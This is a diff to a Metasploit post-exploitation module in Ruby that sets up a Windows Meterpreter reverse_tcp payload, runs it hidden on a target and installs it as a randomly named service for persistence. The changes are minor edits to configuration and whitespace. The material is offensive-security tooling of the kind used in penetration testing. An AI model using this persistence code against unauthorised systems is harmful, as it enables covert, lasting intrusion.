@@ -5,8 +5,8 @@
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -60,7 +60,6 @@ class Metasploit3 < Msf::Post
 				OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
 				OptString.new('REXE',[false, 'The remote executable to use.','']),
 				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
-				OptString.new('ACTION',[true, 'Use TEMPLATE or REXE mode.','TEMPLATE']),
 				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
 			], self.class)
 
@@ -87,7 +86,7 @@ class Metasploit3 < Msf::Post
 		encoder = datastore['ENCODER']
 		iterations = datastore['ITERATIONS']
 		@clean_up_rc = ""
-		host,port = session.tunnel_peer.split(':')
+		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
 
 		if  datastore['ACTION'] == 'TEMPLATE'
@@ -325,7 +324,7 @@ class Metasploit3 < Msf::Post
 	def target_exec(script_on_target)
 		print_status("Executing script #{script_on_target}")
 		proc = datastore['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
-		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})		
+		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
 
 		print_good("Agent executed with PID #{proc.pid}")
 		@clean_up_rc << "kill #{proc.pid}\n"
@@ -347,7 +346,7 @@ class Metasploit3 < Msf::Post
 	# Function to install payload as a service
 	#-------------------------------------------------------------------------------
 	def install_as_service(script_on_target)
-		if  is_system? or is_admin?  
+		if  is_system? or is_admin?
 			print_status("Installing as service..")
 			nam = Rex::Text.rand_text_alpha(rand(8)+8)
 			print_status("Creating service #{nam}")
